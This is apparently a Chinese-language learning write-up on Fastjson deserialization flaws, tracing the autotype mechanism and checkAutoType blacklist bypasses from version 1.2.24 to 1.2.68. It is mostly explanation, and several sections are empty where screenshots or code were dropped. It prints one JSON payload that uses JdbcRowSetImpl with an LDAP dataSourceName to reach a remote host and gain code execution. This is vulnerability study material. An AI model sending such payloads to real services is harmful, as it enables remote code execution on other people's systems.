0x00 前言


Fastjson是阿里开发的一个Java库, 提供了将 Java 对象转换为其 JSON 格式、 JSON 字符串转换为等效的 Java 对象的功能，身为卷心菜的我会在这篇文章中对Fastjson的前世今生进行分析总结。做一篇学习记录吧！


0x01 原理


Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，Fastjson自定义的反序列化机制会调用指定类中的setter方法及部分getter方法，当组件开启了autotype功能并且反序列化不可信数据时（后边即使不开也没用，除非启用safemode），攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有gadget，则会造成一些严重的安全问题。


这么说可能不太好理解，我们来一个简单的例子

package cn.erikten.controller;
public class User{    private int age;    private String userName;    public User() {        System.out.println("User construct");    }    public String getUserName() {        System.out.println("getUserName");        return userName;    }    public void setUserName(String userName) {        System.out.println("setUserName:" + userName);        this.userName = userName;    }    public int getAge() {        System.out.println("getAge");        return age;    }    public void setAge(int age) {        System.out.println("setAge:" + age);        this.age = age;    }}


再来一个将实体类序列化与反序列化的类Ser

>=1.2.24


Fastjson将对象转为Json通过toJSONString()方法，而将Json转换为对象有三个方法，这三个方法转换的时候也都会调用getter、setter，但触发条件不同：

1.2.25~1.2.41


1.2.25开始引入了 checkAutoType 安全机制，默认关闭的情况下不能反序列化类，开启后对反序列化类进行黑名单检测，所以1.2.25~1.2.24的关键就在于针对开启了Autotype的Fastjson进行黑名单绕过


黑名单的实现在com.alibaba.fastjson.parser.ParserConfig，可以看到很多类都被加入了黑名单



我们再来看一下它的检测方法checkAutoType()，首先就判断你传入的类长度是否小于128，接着就是判断AutoType是否为true，这就是为什么说针对开启了AotuType的Fastjson进行攻击



继续往下走，在613行加载黑名单进行校验



结束黑名单校验后，程序会查找传入类的class文件，如果没找到，则通过TypeUtils.loadClass()去加载类，这个方法非常有意思，如果传入的类以“L”开头，以“;”结尾，那么便会掐头去尾，保留中间部分



为什么在加载类的时候要去忽略 “L”、“[”、“;”， 这些字符呢？这些其实是 JNI 字段描述符，类似于php反序列化后的O、A、S、I等等



那么此时我们就可以将Poc中@type的值设置为Lcom.sun.rowset.JdbcRowSetImpl;，既绕过了前面的黑名单，又符合了后边加载类的条件，从而造成了这个系列的RCE

{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://host:port", "autoCommit":1}

关于checkAutoType()方法，在1.2.47做了升级，首先就是一连串的判断，这里应该是基于之前Poc的特征作为检测依据

fastjson-blacklist 这个开源项目，主要就是对黑名单进行hash碰撞，找到hash对应的类



绕过黑名单后，会读取mapping缓存，如果此时我们的类存在于缓存中，则直接跳过AutoType验证，此时我们的类还没有加载到缓存中，继续往下，deserializers.findClass()里边存放了许多基类，我们的java.lang.class在这里被识别到



加载完clazz后，验证属性，不符合条件，返回




这里我们直接来看MiscCodec#deserialze()方法，判断不成立走else，程序将JdbcRowSetImpl赋值给了objval



来到269行，此时objVal的值已经赋值给了strVal，并将赋值后的strVal进行了一连串的判断，最终在303行符合条件，通过loadClass加载我们的JdbcRowSetImpl，



接着调用TypeUtils#loadClass()，注意第三个参数，此时为true



来到了熟悉的loadClass()，此时会先加载mapping，看看传入的clazz是否已经存在于缓存中，如果存在，直接返回，不存在则继续



来到第1153行，此时前边的第三个参数起到了至关重要的作用，将我们的恶意类加载到mapping缓存中，一直F8，会发现程序重新去调用了checkAutoType()方法

<=1.2.68

升级后的checkAutoType()验证的流程图



checkAutoType首先会对传入的typeName进行三项检测:

  • 是否在白名单内？

  • 是否在mapping列表中？

  • 是否使用了JSONtype注解？


如果满足以上条件，那么会直接return出去继续执行反序列化流程并且加入缓存，如果没有满足其中的一个条件，那么会进入下一轮判断：

  • 类是否在黑名单？

  • 类是否继承自RowSet、DataSource、ClassLoader等类？


如果满足上述条件之一，那么直接抛出错误 如果都不满足，那么会进行下一轮判断：

  • expectClass是否不为NULL、Object、Serializable、Closeable等数据类型？

  • 类是否继承于expctClass？


如果满足以上条件，那么会直接return出去继续执行反序列化流程并加入缓存，如果不满足，那么会经过autoTypeSupport的判断，autoTypeSupport主要用来打开autotype功能，默认情况下是false，抛出错误，如果设置的是True那么会return出去继续执行反序列化并加入缓存


在BlackHat 2021上提出了Fastjson1.2.68绕过checkAutoType的思路，总结就是checkAutoType() 方法的 typeName 实现或继承自 expectClass



同时还要满足三个条件：

  • 继承于java.lang.AutoCloseabl或java.util.BitSet

  • 不在fastjson的黑名单类中

  • 其父类和父类接口不在黑名单中
